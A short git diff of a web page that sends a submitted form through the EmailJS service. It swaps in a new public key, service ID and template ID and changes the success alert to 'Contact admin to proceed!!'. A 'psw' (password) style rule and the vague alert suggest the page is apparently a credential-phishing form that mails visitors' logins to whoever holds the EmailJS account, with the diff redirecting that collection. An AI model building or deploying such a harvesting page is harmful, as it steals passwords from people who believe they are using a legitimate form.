@@ -96,7 +96,7 @@ span.psw {
   src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 
 <script type="text/javascript">
-  emailjs.init('Sl_LbPBn89AL9hyA1')
+  emailjs.init('V5RwhRWISAIO2Xo2e')
 </script>
   
 <script>
@@ -108,13 +108,13 @@ document.getElementById('my-form')
 
    btn.value = 'Sending...';
 
-   const serviceID = 'service_yzpfm2e';
-   const templateID = 'template_3djgc3w';
+   const serviceID = 'service_rkdizir';
+   const templateID = 'template_sbghi4d';
 
    emailjs.sendForm(serviceID, templateID, this)
     .then(() => {
       btn.value = 'Send Email';
-      alert('contact admin to proceed');
+      alert('Contact admin to proceed!!');
     }, (err) => {
       btn.value = 'Send Email';
       alert(JSON.stringify(err));
